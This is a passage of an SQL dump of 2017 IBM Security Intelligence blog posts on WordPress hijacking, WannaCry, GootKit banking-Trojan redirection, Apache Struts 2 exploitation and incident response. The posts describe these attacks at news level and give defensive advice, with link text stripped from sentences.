Overall, we observed over 1,000 different WordPress themes being targeted as insertion points by attackers. The WordPress plugins and themes observed in the campaigns we monitored all appeared to be genuine WordPress extensions available for download. Again, attackers opt to take advantage of existing, reputable resources to infiltrate websites. \n The attackers’ HTML or PHP code usually contains a simple redirect, which links to a marketing campaign. The goal is to drive traffic to the malicious site, whether it’s clickfraud, phishing or a malware-serving site. This method is very popular among spammers who direct traffic to  . After they gain illicit access to a compromised website, attackers attempt to send mass spam emails to unwary users containing the malicious URL. For example, the URL   was inserted into the sample email shown below: \n Data on the compromised domain shows that it was created in 2015 — not a newly created site, but an existing one that’s been live for two years. Legitimate sites are attractive because they have good reputations, no malicious activity flags and will not set off any alarms when sent in email. Users who click through will be immediately redirected to a completely different and malicious site. This modus operandi has a number of advantages for the spammers. By using the WordPress page as a redirecting stage instead of a direct hosting page, they reduce the chances of being detected by the page’s administrator. Another popular method among cybercriminals is hijacking and abusing legitimate domains for their purposes. Similarly, these fraudsters appear to prefer the long-standing domains that already have a reputation and have been online for a while. Typical spammer behavior is to register a new domain and then use it as quickly as possible in a spam campaign to bypass spam filters that rely on domain reputation. We often observe spam campaigns where the domains used are only hours or sometimes even minutes old. This is where the domain’s age can play a central role in judging its legitimacy factor; the longer a compromised domain has existed, the more likely it is to have been a legitimate one originally. Drawing on data from our spam traps, we could see that almost 95 percent of WordPress-based domains we observed in spam emails were most likely legitimate sites, older than 90 days. Ninety percent of the domains are older than six months, and over 78 percent are more than 1 year old. This is a strong indication that established sites are being compromised and then used in spam campaigns. Although we used WordPress as an example for its prevalence overall, this is   being targeted by cybercriminals. \n In further analysis of campaigns that abused WordPress sites, we discovered that in some cases even relatively up-to-date sites were compromised. We found that almost 68 percent of compromised hosts were running a version of WordPress less than six months (about three versions) old, and over 40 percent were running a version less than 30 days (at most one version) old. \n \n The fact that a high percentage of WordPress installations are up to date and yet still got compromised by spammers could indicate that spammers take advantage of a WordPress vulnerability soon after it becomes known, reducing the window of time during which a system admin can install the latest WordPress patches. Worse still, cybercriminals could be exploiting  , for which no security fixes are available. Since WordPress is so widely used, a single vulnerability could lead to many websites being compromised. \n The data collected by X-Force correlates well with the spam and malicious page trends we see in the wild. Stopping this rampant phenomenon is not an overnight feat, but keeping sites safer — or cleaning them if affected by malcode — is a relatively easy task. Attackers typically leave a very small footprint on the WordPress site, often a mere HTML or PHP document hidden in one of the subdirectories. For this reason, a system admin may not even be aware that the system has been compromised. If the document remains on the system, the same host could be leveraged again in future spam campaigns. To stop repeated abuse by spammers, it is important for the WP system admin to not only install the  , but also to actively scan the WordPress installation to weed out any unwanted content. This requires proactive monitoring of the WordPress deployment and notifications on changed files and content. This process can help analysts identify impostor files and allow the site to get back to managing only its legitimate activity. To keep websites safer and more immune to attacks, WP system admins can improve the integrity of the system by installing new plugins and themes only from trusted sources such as the   and by avoiding free versions of commercial plugins that may have been  . An effective defense against cybercriminals seeking to compromise WordPress websites starts with thorough patching and updating processes. Admins that make the effort to update on time enjoy better security and fewer incidents in the long run. It’s also critical to keep up to date with vulnerability advisories and threat intelligence to know when specific versions are being abused by attackers. Join   to keep updated about the threats most relevant to you.', '\'Content Management System (CMS)\', \'Malware\', \'Patch\', \'Patch Management\', \'Phishing\', \'Phishing Attacks\', \'Phishing Emails\', \'Vulnerabilities\', \'WordPress\', \'WordPress Vulnerability\'', 'https://securityintelligence.com/relying-on-data-to-mitigate-the-risk-of-wordpress-website-hijacking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, 'When a Cyber Crisis Hits, Know Your OODA Loops', 'Caleb Barlow', '2017-5-30', 'In the months since we began simulating full-scale cyberattacks for customers at our   in Cambridge, Massachusetts, I’ve watched a steady stream of corporate security teams confront the hair-raising experience of a simulated cyberattack.\n The Command Center recreates the whole crisis from start to finish, featuring a controlled, live-fire simulation of a cyberattack that enables the customer’s team to dry run a response with the help of the IBM X-Force Incident Response Intelligence Services (IRIS) team and advanced tools such as  . It also includes some of the human issues that need to be addressed, such as calls from law enforcement authorities, angry investors, regulators and the press.\n I had originally expected our customers’ greatest needs to be technology-related, but I’ve found that most of them have covered those bases pretty well. What has surprised me is how ill-prepared many are for the human decision-making part of the process. They’re pretty good at shutting down a distributed denial-of-service (DDoS) attack, but they turn to jelly when questioned by a reporter or are paralyzed by a ringing phone.\n The reason? Lack of OODA loops. I’ll explain.\n When a serious cyberattack makes the headlines, companies need to take action — any action. They need to talk, even if they have no new information. As   against the airline industry have shown, silence and obfuscation are deadly in a crisis. You need to reassure stakeholders that you’re on top of the problem and doing all you can.\n The boardroom thinking that guides many enterprises these days isn’t very well-tuned for rapid response. Managers who act quickly are seen as impulsive, reckless or undisciplined. In today’s big data world, our culture rewards people who gather all the facts and penalizes those who act on instinct.\n But crises don’t give you the luxury of time to gather all the data. I spent 15 years as an emergency medical technician and firefighter before I joined IBM. In those roles, I came to appreciate the value of gut instinct by experienced people. There are many disciplines in which on-the-spot decision-making is critical — we don’t want trauma surgeons to have to consult manuals, or fighter pilots to wait for instructions when an enemy is on their tail.\n Social scientists have a term for this  : System 1 thinking. It’s characterized by a fast, automatic, intuitive approach, typically informed by experience. That’s distinctive from System 2 thinking, which is more methodical and thoughtful.\n Both approaches are appropriate in different situations, but System 2 thinking is currently more in favor among corporate executives, thanks to the popularity of data-driven management. I fear that the value of System 1 thinking is being shunted aside in the process, and that’s bad when a crisis hits.\n OODA loops are a tool for System 1 thinkers. OODA stands for “observe, orient, decide and act.” The concept was developed by the U.S. military to train soldiers to make decisions when there’s no time to gather all the data. Instead of focusing on the best decision, the OODA loop concept teaches us to  , put it in context and quickly make the best decision with the understanding that we can always make changes as more data becomes available.\n It’s like navigating a maze in a puzzle book. Some people dive right into a solution, drawing lines and inevitably running into dead ends. Others wait, analyze and start drawing only when they’re certain of the correct path. Both approaches are valid ways to solve the puzzle. We need to appreciate the value of each.\n Cyberattacks don’t often give us the luxury of time, which is why it’s important to have knowledgeable people who can show immediate progress. Unfortunately, those qualities are rare in my experience — our analytical culture discourages it.\n Every organization needs to understand how to use OODA loops. It requires rethinking some commonly held assumptions.\n Know when some action is better than no action. If your house is on fire, anything you do to extinguish the blaze is better and then standing and watching it burn. The same applies to a cyberattack: Demonstrate that you’re  , even if that course of action doesn’t turn out to be the best one in the long run. Like a sailboat tacking toward its destination, you want to maintain forward momentum.\n Accept and learn from failure. Most organizations are terrible at this, but failure is part of the process of finding a solution. Experienced people armed with facts and context will usually take constructive action. They’ll learn from their mistakes and make better decisions. The OODA loop teaches that no decision should ever be set in stone and that small failures are better than no action at all.\n Finally, tell what you know. No one expects you to have a complete solution at hand in the midst of a crisis. What they do want to see is that you’re on top of the situation and working toward a resolution. In the absence of information, outsiders will tend to assume the worst, so be sure to talk a lot. Tell them what you’re doing and be open to suggestions.\n Every chief information security officer (CISO) should be familiar with the concept of  . In a cyber emergency, the people who act are their best friends.', '\'Chief Information Security Officer (CISO)\', \'Cyberattack\', \'IBM X-Force Command Center\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Security Leaders\', \'Security Leadership\'', 'https://securityintelligence.com/when-a-cyber-crisis-hits-know-your-ooda-loops/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, 'Unwrapping the Mystery: Did a Big, Slimy Internet Worm Make Hundreds of Organizations WannaCry?', 'Limor Kessem', '2017-5-25', 'Two weeks into the  , response teams are getting back to normal, organizations are re-evaluating their infrastructures, and even the bitcoin payments the fraudsters were collecting have almost stopped trickling in. It’s time now to look into the data to find clues about what made WannaCry spread so rapidly and with such a wide scope. Is the mystery nothing more than a big slimy internet worm? So far, that’s what   shows. According to data from IBM X-Force, which includes spam monitoring, managed clients and incident response data, we have been observing the rapid spread of the WannaCry ransomware outbreak. Within 48 hours, the malware had infected   across the globe. More than 150 countries were affected, and there was no end in sight. Only the   of a kill switch managed to slow down the havoc, which was spreading like wildfire. But at the end of the day, WannaCry is nothing more than ransomware. Although it does have devastating effects, it is not considered sophisticated, and it is typically operated by groups that just want a little money. Yet something made it become the   of all time. The fact is, ransomware campaigns, as large as they may be, usually only infect one person at a time. On corporate networks, shared drives or mapped cloud drives can also get encrypted, but normally the spread is limited to the infected endpoints or to that one company. Whether it comes via malware-laden email attachments or through stealthy exploit kits that drop the malware without a sign, a campaign’s overall reach remains limited and takes a lot more time than WannaCry did. IBM X-Force scanned over 1 billion spam emails in search of WannaCry payloads and found none. To date, not one security vendor has managed to locate a spam email carrying this particular payload. Combining these factors, the answer to the smoking gun question might be as simple as it is old: It was nothing more than a computer worm. Without its worm replication, WannaCry would have never been able to spread the way it did. \n A worm it might be, but it needed some help to spread through organizational networks the way it did. In these relatively protected environments, how was that possible? Looking at past cases, a pattern emerged. The recipe is rather predictable: Having analyzed the malware and seeing that it generated randomized IP addresses to scan for, X-Force researchers went back to the data to look for those ingredients with the theory that WannaCry was indeed that sort of worm. We were seeing a definite spike in port scanning for Transmission Control Protocol (TCP) ports 139 and 445 on the days the attack broke, since firewalls denied events on those ports. The significant increase started on May 12, 2017, at 8 a.m. UTC and lasted about 24 hours at the initial phase. The worm was looking for a way in and a means to serve up its next ingredient: a potentially viable exploit. This is where things got more interesting. The exploit WannaCry used was taken from a public leak facilitated by a group that calls itself Shadow Brokers. The group alleged that it managed to   and exploits directly from the National Security Agency (NSA), which led many to see these exploits as weapon-grade tools. The malware’s operators not only gained access to at least two of those exploits, but they also knew how to use them, which could be a hint as to the class of actors involved. One particular exploit, dubbed EternalBlue, was being used to compromise the   in networks that allowed SMB to be accessed from the external world. Access to SMB, which is a resource and file sharing protocol, should not be enabled at all and is effectively disabled on consumer internet connections (cable modems and home user ISPs block port 445 that communicates via the SMB protocol). After all, what organization would want outsiders to share their files, printers or other network assets? Alas, unpatched Microsoft vulnerabilities and security misconfigurations eventually allowed the worm to exploit the SMB protocol in a large number of random networks. SMB v1 and SMB v2 were vulnerable on unpatched systems, while SMB v3 was not. WannaCry most likely got there by an arbitrary scan across the internet in search of soft spots to hit. As it turns out, it found quite a few targets across industries and critical infrastructure throughout the globe. The highest prevalence was recorded in   and  , as well as other countries in that region. This might be because those countries had more unpatched, legacy, and outdated or pirated operating systems running. It may be unsettling to come to terms with, but WannaCry was both  . According to the data available at this time, the attack appears to have followed an age-old recipe for spreading and exploiting weak networks: Computer worms, or rapidly self-replicating programs, are as old as the internet itself. Dating back as far as 1949, John von Neumann, a pioneer in the discovery of self-replicating cells and human DNA,   that would lead to the creation of the first computer worm, as in self-replicating data. Two decades later, in 1971, the first actual worm,  , was created to access endpoints via the ARPANET. Worms have not stopped appearing since. Fast forward to the past 20 years, and we can all recall the megaworms that have hit since the year 2000. Below are some of the most notorious: The list goes on and on. In light of these historical cases, it’s fortunate that WannaCry was not that fast spreading, relatively speaking. But unlike its predecessors, it carried a paralyzing payload or ransomware. As we witnessed, that made for a very nefarious combination, and similar cases can be expected in the future. In the  , we’re left with questions about the motives behind the outbreak. It is increasingly clear that, unlike other ransomware attacks, WannaCry was not about money. The malware only managed to collect a very conservative amount of bitcoin relative to its unprecedented reach — about 50 BTC at the time of this writing. Those wallets are being watched closely by law enforcement agencies, so the attackers cannot move them without being discovered. If not money, then what was the motive to wreak havoc across the globe? Some voices have been hinting at a  , due in part to the discovery of code overlap between WannaCry tools and those used by the Lazarus group that perpetrated the Sony and SWIFT attacks in 2014 and 2016, respectively. While IBM Security agrees with the analysis that code overlap does exist between WannaCry and Cantopee, the backdoor reportedly used by Lazarus Group, we think it’s still rather early to tie a connection to a specific actor. We need more evidence beyond this single piece of data. The Lazarus Group malware has been widely discussed and publicized in recent years, and it is possible that whoever is responsible for WannaCry had access to the same source code. In this case, relying on code overlap alone for attribution may not be as effective. As WannaCry dies down, we’re left with an important lesson: Amid the technological sophistication of our times,   are crucial and should be revisited thoroughly as key risk indicators such as WannaCry change our threat landscape going forward.', '\'Advanced Threats\', \'IBM X-Force Research\', \'Insider Threat\', \'Malware\', \'Microsoft\', \'Ransomware\', \'Vulnerability\', \'WannaCry\', \'Worm\', \'X-Force\'', 'https://securityintelligence.com/unwrapping-the-mystery-did-a-big-slimy-internet-worm-make-hundreds-of-organizations-wannacry/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, 'Incident Response: Planning for the Attack Before It Happens', 'Wendi Whitmore', '2017-5-25', 'By now, you’ve no doubt heard of  , the ransomware attack that impacted over 300,000 victims in more than 100 countries over the past 10 days. While we’ve all focused on   to prevent further infection, an important part of the discussion is how to plan for a successful incident response (IR) to ransomware and other types of attacks. When dealing with ransomware attacks, the primary goal is to avoid falling victim in the first place. The key is to consistently back up your most critical data. You should also ensure that your backup servers and systems aren’t always connected to the network. That way, a ransomware attack within your environment will have little impact, since you’ll still be able to access your critical data. That said, an effective backup strategy is simply one part of a larger security and response plan, which should be developed proactively. To successfully combat ransomware and other types of targeted attacks, it’s critical to create an incident response plan, document it and test it regularly to identify gaps and changes within the environment. \n Organizations that have a documented incident response plan and an IR team, whether it’s internal, external or a combination of both, can respond to a breach more quickly than those who don’t. Organizations that are able to complete an investigation in 30 days or less   over those who don’t. Furthermore, organizations that document their plans and test them quarterly or biannually are able to more effectively prepare for security incidents and practice their response actions in advance of a real attack. This allows these enterprises to accelerate the process of response and investigation, greatly reducing data exposure and financial losses. An   should contain a broad scope of technical and nontechnical actions that need to be conducted by all stakeholders within the environment. This requires leaders to ask questions such as: Documenting and regularly testing a variety of scenarios helps organizations determine where gaps may exist. Most importantly, this enables security teams to fix vulnerabilities in advance of a breach. The   team specializes in providing incident response planning, program development, response to critical breaches, remediation and threat intelligence to clients in over 133 countries. We have experience responding to and containing many of the largest data breaches in the world. To learn more:', '\'IBM\', \'IBM Security\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\', \'Ransomware\', \'Threat Intelligence\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/incident-response-planning-for-the-attack-before-it-happens/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (104, 'GootKit Malvertising Brings Redirection Attacks to Italian Banks', 'Limor Kessem', '2017-5-23', 'Earlier in May, I reported that GootKit had   for the first time. The malware prepared for its new modus operandi in the U.K., targeting major banks there with this advanced browsing manipulation attack. I also predicted that this was just a test and that we’re about to see more. That prediction has come true. GootKit officially expanded the redirection attacks to six major banks in Italy, additionally targeting one of the local digital banking platform providers. Why Italy? Although GootKit is mostly focused on the U.K., it is active in Italy, Spain and France as well. The bulk of GootKit attacks actually focus on these few countries, which is also what keeps it relatively limited in its global ranking among the top most active banking Trojan families. Since it began focusing the redirection scheme toward Italian targets, GootKit has also added quite a few instances of Google Ads application program interfaces (APIs) and Facebook Pixel to the configuration. The scheme here is redirection or injection, which might suggest the malware is abusing these services to inject into legitimate online ads. When checking into the detection of a recent  , many antivirus engines detected it as the CrossRider adware. This might indicate that current infections are being delivered through malvertising campaigns. GootKit has been rather consistent in leveraging malvertising via the   to trap users with the RIG exploit kit and infect them through a sleek drive-by download. With that, campaign delivery can change anytime, and past campaigns saw GootKit delivered via email attachments and the Godzilla loader. After a rather quiet first quarter in 2017, GootKit’s operators kicked into gear in April and have been ramping up campaigns in the second quarter. \n Since this is the first time that banking Trojan redirection attacks have been directed at banks in Italy, banks in the country should prepare and inform themselves about the scheme. The malware redirection GootKit performs is not just a simplistic redirection from one website to another. It is a sophisticated M.O. used by a number of elite cybergangs like Dridex, TrickBot and GozNym to bypass bank security measures by hijacking the victim to a malicious website they host on their own servers before the victim ever reaches the bank’s site. To make this happen, malicious websites are prepared in advance to provide a replica of the bank’s website. Thus, victims usually don’t realize they haven’t reached the bank’s true site. On top of the visual effect, the redirection attack is known for presenting the victim with the correct bank URL in the address bar and even the bank’s actual security certificate through a browser manipulation scheme. In fact, GootKit’s scheme is quite similar to the one  . Overall, the execution of such redirection attacks necessitates the resources and capabilities of organized cybergangs that have developers on the team. This is due to the extra setup required to pull them off, such as the unique site replicas that must be maintained for each target. The redirection technique first surfaced in banking Trojan attacks in 2014, when the Dyre gang launched it against banks in the U.K. The GootKit malware was   in 2010 as a low-risk backdoor and information stealer, but it has since evolved into a banking Trojan and has been observed in attacks since the summer of 2014. Nowadays, GootKit is considered one of the most advanced banking Trojans active in the wild. It is used in online banking fraud attacks on consumer and business bank accounts, mostly in European countries. GootKit is an ongoing malware project that implements advanced stealth and persistence alongside real-time, web-based activities such as dynamic webinjections, which it can display directly in the infected machine’s browser. According to X-Force research, GootKit affects the three most popular browsers: Internet Explorer, Mozilla Firefox and Google Chrome. In terms of its internal makeup, unlike most malware of its grade, GootKit relies very little on leaked source codes from previous generations. Aside from its borrowed Zeus Trojan webinjection mechanism, X-Force research noted that it is a private project that was written in node.js, a rather uncommon choice for malware projects to adopt. This research also indicates GootKit is developed and operated by a small, Russian-speaking cybergang that does not share or sell the source code to others. The most recent   was detected and analyzed by IBM Trusteer researchers in February 2017.   released a paper providing a technical view of GootKit’s stealth mechanisms in March 2017. GootKit is featured on X-Force Exchange as an   featuring technical analysis papers. IBM Security has studied redirection attacks schemes employed by the banking Trojans that use them against bank customers and can help banks and other targeted organizations learn more about this high-risk threat. Banks should leverage adaptive malware detection tools to   from fraud and other external threats. These tools should provide real-time insights into cybercriminals’ techniques and capabilities, allowing them to evolve along with the ever-shifting threat landscape. To prevent Trojan attacks, users should disable ads and avoid sites that are typically used as infection hubs. Other online hygiene best practices include installing the latest operating system updates, updating frequently used applications and deleting those that are seldom used. For more online safety tips, please visit our   page. IBM X-Force examined the following MD5s for this research:', '\'Banking\', \'Banking Trojan\', \'Financial Industry\', \'GootKit\', \'IBM X-Force Research\', \'Malvertising\', \'Malware\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/gootkit-malvertising-brings-redirection-attacks-to-italian-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (105, 'Lessons Learned From the WannaCry Ransomware Attack and Many Others That Preceded It', 'Sumukh Tendulkar', '2017-5-17', 'If you’re reading this post, congratulations! You hopefully aren’t using one of the   computers that were hit by the first wave of the WannaCry ransomware attack. Those unfortunate victims are dealing with bigger problems right now, such as how to admit patients to their emergency rooms or ship perishable items to their destinations without the help of working computers. As this attack demonstrated, the cost of   goes far beyond the fee that’s demanded to get back your files; it brings down businesses and even threatens lives. Most experts,  , recommend against paying ransoms, which have no guarantee of success and can even target you for further attacks. A better strategy is to prevent attacks in the first place. Here are some lessons we’ve learned from this and other attacks. WannaCry didn’t come out of nowhere: It exploited a known Microsoft vulnerability for which the company   two months earlier. Subscribers to the IBM X-Force Exchange received that fix on the same day it was released. It’s particularly important to patch endpoints, such PCs and mobile devices, because that’s where   of ransomware infections originate. The process can be complex, but IT teams can use endpoint tools to deploy patches consistently, reliably and automatically across a broad range of operating systems. A majority of existing endpoint detection and response (EDR) solutions are unable to fully secure organizations from ransomware for three reasons. First, they lack full visibility of endpoints and their statuses, which limits the effectiveness and contextualization of malicious behavior. They also often require complex, post-detection  , which is a challenge in a cybersecurity field that is expected to see 1.5 million vacant positions by 2020. Some of these tools also lack any remediation abilities whatsoever, which reduces an organization’s ability to effectively act upon investigation. Make sure your EDR solution has the appropriate visibility to not only detect, but also contextualize malicious behavior. Tool sets such as   can help solve those two problems and also provide effective remediation based on investigative findings. By various estimates, up to 83 percent of ransomware attacks originate when an employee clicks on a malicious link, opens an infected attachment or visits a compromised website. Employees are the first line of defense, so investing in ongoing training about protecting against phishing and malware should be a priority. \n Deploying patches can be a complex and error-prone process, particularly when old or critical applications are involved. Your intrusion prevention system (IPS), when kept up to date with the most current  , can help prevent ransomware by using signatures to detect and stop it. IBM X-Force Exchange, for example, provides signatures to detect command-and-control (C&C) communication between ransomware and other servers using the specific   vulnerability. For updates, follow the X-Force Exchange  . Organizations that can’t patch can prevent the spread of the ransomware by disabling the outdated and vulnerable Server Message Block v1 in Windows. Additional recommendations are available and continuously updated on the   page. While a good prevention program should stop most ransomware attacks at the door, it can’t protect you 100 percent of the time. A good security analytics platform provides the next level of defense by detecting ransomware activity based on behavior. For example, a simple rule can identify when ransomware is encrypting files at a high rate. When combined with an endpoint management product, this one-two punch can help kill the malicious process before it does significant damage. A cognitive system can also   based on behavior by continually scanning online sources of intelligence, such as threat advisories and blogs. For example, IBM Watson was able to identify one WannaCry ransomware attack based on network traffic going to a suspicious IP address. It learned of the address from a threat researcher’s blog. Sometime breaches occur despite your best efforts. In those cases, an incidence response (IR) platform and team is your last line of defense. An IR platform can help orchestrate the response to ransomware attacks by helping to align people, processes and technologies in a predictable and efficient manner. Any good IR platform supports the  . IBM Resilient’s Dynamic Playbook adapts in real time as information about an attack is uncovered, generating a response based on the most current information. Most successful organizations also turn to IR services providers during times of crisis. When choosing IR vendors, select one with a breadth of experience in not just ransomware, but also other areas of cybercrime. This vendor should have prior success in assisting customers to align their response and restore normal operations. A good IR provider can help you hit the reset button by bringing your backed-up data and systems back online. IBM’s IR works with customers to ensure that restored systems are not vulnerable to similar attacks and can also improve defenses against future incidents.', '\'Advanced Malware\', \'IBM X-Force Exchange\', \'Incident Response (IR)\', \'Malware\', \'Ransomware\', \'WannaCry\'', 'https://securityintelligence.com/lessons-learned-from-the-wannacry-ransomware-attack-and-many-others-that-preceded-it/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (106, 'Not-So-Terrible Twos: IBM X-Force Exchange Celebrates Its Second Birthday', 'Pamela Cobb', '2017-5-17', 'There are certain knowing glances that experienced parents give each other in the face of a public toddler meltdown. The sheer red-faced, quaking, loud explosion of the tantrum reminds us that 2-year-olds are entirely exasperating human beings and terrible roommates. But there is a new kind of 2-year-old on the scene now that is well-behaved, well-groomed and, frankly, pretty helpful. We had hoped that when IBM X-Force Exchange  , it would become a hub of threat intelligence collaboration, allowing security analysts to streamline investigation workflows, and work together to better protect their networks and organizations. We’ve grown the user base of X-Force Exchange to over 32,000 registered users, and the number of visitors to the site is almost 15 times that. Our registered users includes not only users outside of IBM, but also  , analysts and practitioners who use the platform daily to help build better protection for IBM Security products, monitor our Managed Security Services (MSS) clients, and help customers as part of the IBM X-Force Incident Response and Intelligence Services (IRIS) engagements. Registered users are not the only ones taking advantage of the platform features. In 2016, we made our public collections truly public by ceasing to require users to log in to view them. This helped our IBM X-Force research findings and collections, including those created for various malware campaigns such as   and  , to be accessible by anyone with the click of a mouse. This openness translates to all our reports as well, with threat intelligence on vulnerabilities, URL and IP reputation, and web application risks assessments available to be publicly searched. That volume has grown to nearly 2 million executed searches since the platform was released. IBM continues to beef up higher levels of threat intelligence with insights from our X-Force research team. To date, those collections number over 200 and range from deep insights on malware campaigns to massive collections of   to help organizations stop incidents before they become serious issues. You can identify a formal X-Force Advisory by the presence of the X-Force shield on the collection card, and an X-Force researcher by the presence of a blue bar next to an avatar. We’ll continue to provide research that sheds light on the business impact and risk assessment for security teams, and tie it back nicely to a collection on X-Force Exchange for the technical indicators and threat intelligence reports. With these insights, it’s easy to take preemptive actions, such as blocking access to a URL or quarantining a troublesome file. The X-Force Exchange team constantly innovates to help improve the jobs of security analysts. The team has added updates from the X-Force Threat Analysis Service, a daily subscription email from our MSS team that includes current indicators on active attacks on our monitored client environments. To see these in X-Force Exchange, go to Public Collections and filter on “xftas”. We introduced the ability to bring additional   into X-Force Exchange in December, and the roster of partners keeps growing. It’s become even easier to pay attention to critical areas with   and  . Collaboration is made even smoother due to the ability to create collections with as many or as few peers as you want using private groups. To stay up to date on these and other new features added to X-Force Exchange, follow the   tag here on Security Intelligence. If you haven’t yet visited  , try it now! I promise, there are no small toys with sharp corners to step on.', '\'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Information Sharing\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\', \'X-Force Features\'', 'https://securityintelligence.com/not-so-terrible-twos-ibm-x-force-exchange-celebrates-its-second-birthday/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (107, 'Apache Struts 2: A Zero-Day Quick Draw', 'Dave McMillen', '2017-5-16', 'During an outbreak of   attacks, IBM X-Force needs to work fast to assess the threat to inform customers and others of the risk and offer steps to mitigate or resolve the issue. Once the dust settles, though, we like to circle back, review what happened and identify any notable trends. The attacks launched against the Apache Struts 2 vulnerability ( ) disclosed in March is a prime example of how quick the black-hat community can leverage zero-day vulnerabilities and set up distributed attack mechanisms. At its peak, according to IBM Managed Security Services (MSS) data, attack activity increased 48 times above the average number of attacks for the time period assessed. Apache Struts 2 is an open source web application framework for developing Java EE applications. On March 6, Apache released   warning about a previously unknown remote code execution (RCE) vulnerability contained within the Jakarta Multipart parser in multiple versions of Apache Struts 2. In less than 24 hours, a Python script was created to take advantage of this weakness, and a   noted “immediate exploitation occurring.” \n On March 10, IBM X-Force began to see attacks exploiting this vulnerability aimed at monitored clients. These attacks peaked March 23, which coincided with the day Apache  . Although the volume of attack activity subsided considerably within a week of this spike, we are still seeing a persistent volume of activity targeting this vulnerability. Our analysis found that almost 50 percent of the attacks originated from China. This is not surprising, since it was reported that the   first surfaced on Chinese forums, and   reported seeing the first initial attacks from China. Meanwhile, 22 percent of the attacks originated from U.S. The distribution of the top two source countries is similar to what   have reported. Over 45 percent of all targets were located in the U.S., followed by Australia at 28 percent and the U.K. at 17 percent. The top attacked industries were education (32 percent), accommodation and food services (23 percent), financial services (23 percent), manufacturing (12 percent) and health care (10 percent). Organizations in the education sector are often considered easy targets due to a combination of immature   and relaxed monitoring, if any. This combination guaranties relative longevity and persistence of the compromise. However, in general, this was a zero-day campaign. Attackers were focused on finding and exploiting vulnerable targets with little regard for industry. \n As revealed in the  , Shellshock attacks, which first surfaced in September 2014, persisted throughout 2016. The vulnerability targeted in these attacks is relatively easy to exploit and unpatched systems are plentiful — and, therefore, worth the attackers’ while. Will exploitation of this latest Apache Struts 2 vulnerability follow in Shellshock’s footsteps? It’s hard to say. Like the GNU Bash Shell, Apache Struts 2 is widely used. Also, the nature of the vulnerability — code execution — allows attackers to use the compromised machines in wide range of   such as distributed denial-of-service (DDoS) botnet attacks and ransomware campaigns. The combination of publicly available exploit code and lack of appropriate   practices across many organizations may perpetuate this threat for the foreseeable future. So how do you address this issue? Apply the appropriate update for your system. If you are using the Jakarta-based file upload Multipart parser, upgrade to Apache Struts version 2.3.32 or 2.5.10.1. You can also switch to a   of the Multipart parser. Failure to apply patches and fixes leaves your organization at risk of attack. Additional information can be found on  .', '\'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Patch Management\', \'Vulnerabilities\', \'Vulnerability\', \'Zero-Day Attack\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/apache-struts-2-a-zero-day-quick-draw/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (108, 'WannaCry Ransomware Spreads Across the Globe, Makes Organizations Wanna Cry About Microsoft Vulnerability', 'Limor Kessem', '2017-5-14', 'On Friday, May 12, 2017, the world was alarmed to discover that cybercrime had achieved a new record. In a widespread ransomware attack that hit organizations in more than 100 countries within the span of 48 hours, the operators of malware known as   are believed to have caused the biggest attack of its kind ever recorded. Perhaps more than anything else, this   onslaught is a resounding reminder of the importance of security basics, especially when it comes to Microsoft product patching. Those who applied critical Microsoft Windows patches released in March were protected against this attack. Another basic protection is the possession of current, offline backups of data. For ransomware attacks like this one, having a viable backup will enable a successful  , leaving attackers high and dry and unable to collect money for their evil doings. \n WannaCry, WanaCrypt or Wcry for short, is ransomware that works like other malware of its type, with a few intricacies that highlight the sophistication of its operators. First, the malware uses exploits that were supposedly leaked by a group that calls itself  . The result of leaking exploits very often gives rise to malicious actors who use them for their nefarious purposes, which is what happened in this case. Second, the malware uses strong, asymmetric encryption,  employing the RSA 2048-bit cipher to encrypt files. This method is considered relatively slow when compared to symmetric encryption , but it is very strong and virtually impossible to break. Third, the malware’s architecture is modular, a feature known to be used in legitimate software, but also in complex malware projects such as banking Trojans. Most ransomware is not modular, but rather simplistic, and carries out its tasks without any modularity. This means that the authors behind Wcry are more likely to be a group of people, more than just one developer, and even possibly one of the   that distribute malware such as Dridex and Locky. Bottom line, we are not dealing with amateurs. This widespread attack is of high severity, and although the vulnerability should have been patched a while back, many organizations have been hit and the count keeps rising. The Wcry outbreak started showing up on May 12, 2017, but it relies on a number of elements that have been around for a while. It even offered a sneak preview a week ago when it showed up in Trojan.Win32.CryptoFF  . Wcry’s propagation method includes port scanning of potential hosts over Transmission Control Protocol (TCP) port 445, which is where the Server Message Block (SMB) network communications protocol take place. This application-layer protocol is being targeted by Wcry to help it spread like a worm. SMB is designed to enable access to shared directories, files, printers and serial ports, among other resources. To find its way into new endpoints and networks, the Wcry malware leverages two SMB-exploitation modes borrowed from the   exploit leak. It starts by trying to get through using an existing backdoor called DoublePulsar. If that backdoor does not exist, it launches a new exploit on the target using what’s known as EternalBlue. DoublePulsar is a previously known, persistent backdoor that can infect endpoints to provide unauthorized access to its operators. This kernel-mode payload does not do much, but it is the basis of other exploits. It enables a remote attacker to send malware into the target endpoint and execute it without the owner’s knowledge or permission. DoublePulsar’s ability to open the backdoor and inject arbitrary dynamic link libraries Dynamic Link Libraries (DLLs) into the user-mode process zones relies on exploitation of the  . It was allegedly an NSA tool that was   in April 2017, and by the time it was out for about two weeks, DoublePulsar was already found on over 36,000 infected endpoints across the globe. EternalBlue is yet another part of the same exploitation framework that includes DoublePulsar. Within the Wcry attack context, it is an exploit designed to scan servers for the presence of DoublePulsar. If none is found, it is used as the   to compromise the system and install the 